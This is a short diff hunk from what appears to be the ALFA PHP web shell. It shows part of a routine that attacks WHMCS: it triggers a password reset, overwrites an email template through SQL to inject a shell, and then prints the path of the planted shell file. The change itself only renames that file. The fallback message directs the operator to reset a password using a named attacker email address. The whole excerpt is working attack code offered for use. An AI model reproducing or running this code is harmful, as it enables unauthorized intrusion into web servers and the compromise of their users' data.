@@ -1949,7 +1949,7 @@ $AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&emai
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert("shell injectet...");
-$ff= 'http://'.$path."/trinitylegion.php";
+$ff= 'http://'.$path."/sukabintang01.php";
 output($ff);}else{
 echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>sukabintang84@gmail.com</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
 }if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
